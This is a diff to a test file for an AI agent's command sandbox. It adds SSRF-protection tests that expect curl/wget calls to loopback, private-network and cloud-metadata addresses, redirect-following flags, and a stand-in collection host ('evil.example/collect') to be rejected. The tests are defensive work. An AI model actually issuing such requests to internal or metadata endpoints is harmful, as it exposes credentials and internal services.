@@ -1,7 +1,7 @@
 import { test, describe, before } from 'node:test'
 import assert from 'node:assert/strict'
 import { fileURLToPath } from 'node:url'
-import { checkCommand, splitSegments, initWorkspaceFiles } from '../../src/agent.js'
+import { checkCommand, splitSegments, initWorkspaceFiles, assertAgentUrlsAllowed } from '../../src/agent.js'
 
 describe('agent: splitSegments 引号感知拆分', () => {
   test('按 | ; && 拆分', () => {
@@ -65,7 +65,7 @@ describe('agent: checkCommand 白名单放行', () => {
   })
 
   test('curl/wget 白名单内的选项与工作区内输出路径放行', () => {
-    assert.equal(checkCommand('curl -sSL https://example.com').ok, true)
+    assert.equal(checkCommand('curl -sS https://example.com').ok, true)
     assert.equal(checkCommand('curl -o ./out.json https://example.com/api').ok, true)
     assert.equal(checkCommand('curl --output ./out.json https://example.com/api').ok, true)
     assert.equal(checkCommand('curl -X POST -H "X-A: 1" -d hello https://example.com').ok, true)
@@ -143,6 +143,70 @@ describe('agent: 沙箱逃逸回归（curl @file / --opt=value / git alias）', 
       else if (fs.existsSync(CONFIG_PATH)) fs.unlinkSync(CONFIG_PATH)
       cfg.setForceLoad(false)
     }
+  })
+})
+
+// —— 2026-09 安全审查：Agent curl/wget 出站 SSRF 防护 ——
+// 禁止直接访问回环/内网/链路本地/云元数据地址；禁止跟随重定向（重定向目标无法校验）。
+describe('agent: curl/wget 出站 SSRF 防护', () => {
+  test('拒绝 URL 字面量中的私有/回环/链路本地/元数据地址', () => {
+    assert.equal(checkCommand('curl http://127.0.0.1:12580/api/config').ok, false)
+    assert.equal(checkCommand('curl http://127.0.0.1/').ok, false)
+    assert.equal(checkCommand('curl http://169.254.169.254/latest/meta-data/').ok, false)
+    assert.equal(checkCommand('curl http://10.0.0.1/').ok, false)
+    assert.equal(checkCommand('curl http://192.168.1.1/').ok, false)
+    assert.equal(checkCommand('curl http://172.16.0.1/').ok, false)
+    assert.equal(checkCommand('curl http://[::1]/').ok, false)
+    assert.equal(checkCommand('curl http://[fe80::1]/').ok, false)
+    assert.equal(checkCommand('wget http://127.0.0.1/x').ok, false)
+  })
+
+  test('拒绝 localhost / .local / .internal / 元数据主机名', () => {
+    assert.equal(checkCommand('curl http://localhost/').ok, false)
+    assert.equal(checkCommand('curl http://localhost:3000/').ok, false)
+    assert.equal(checkCommand('curl http://foo.localhost/').ok, false)
+    assert.equal(checkCommand('curl http://router.local/').ok, false)
+    assert.equal(checkCommand('curl http://metadata.google.internal/').ok, false)
+    assert.equal(checkCommand('curl http://metadata/').ok, false)
+  })
+
+  test('--url 内联/分离形式同样受主机校验', () => {
+    assert.equal(checkCommand('curl --url=http://127.0.0.1/').ok, false)
+    assert.equal(checkCommand('curl --url http://127.0.0.1/').ok, false)
+    assert.equal(checkCommand('curl --url=https://example.com/').ok, true)
+  })
+
+  test('禁止跟随重定向（-L / --location / 合并短选项 -sSL）', () => {
+    assert.equal(checkCommand('curl -L https://example.com/').ok, false)
+    assert.equal(checkCommand('curl --location https://example.com/').ok, false)
+    assert.equal(checkCommand('curl -sSL https://example.com/').ok, false)
+  })
+
+  test('公网 http/https 目标仍放行', () => {
+    assert.equal(checkCommand('curl -s https://example.com').ok, true)
+    assert.equal(checkCommand('curl -o ./out.json https://api.example.com/v1').ok, true)
+    assert.equal(checkCommand('wget -q -O ./page.html https://example.com/').ok, true)
+    assert.equal(checkCommand('curl -X POST -d hello https://example.com').ok, true)
+  })
+
+  test('assertAgentUrlsAllowed：异步拦截解析到私网的域名（可注入校验函数）', async () => {
+    const rejectAll = async () => ({ ok: false, reason: '域名解析到私有或回环地址，拒绝访问' })
+    const allowAll = async () => ({ ok: true, resolvedIp: '93.184.216.34' })
+    const r1 = await assertAgentUrlsAllowed('curl https://evil.example/collect', rejectAll)
+    assert.equal(r1.ok, false)
+    assert.equal((await assertAgentUrlsAllowed('curl https://example.com/', allowAll)).ok, true)
+    // 无 URL 的命令直接放行，不触发校验
+    let called = false
+    const spy = async () => { called = true; return { ok: true } }
+    assert.equal((await assertAgentUrlsAllowed('ls -la', spy)).ok, true)
+    assert.equal(called, false)
+  })
+
+  test('runCommand 在执行前拦截私网目标（不触网）', async () => {
+    const { runCommand } = await import('../../src/agent.js')
+    const r = await runCommand('curl http://127.0.0.1:12580/api/config')
+    assert.equal(r.ok, false)
+    assert.match(String(r.error), /SSRF|私有|回环|拒绝/)
   })
 })
 
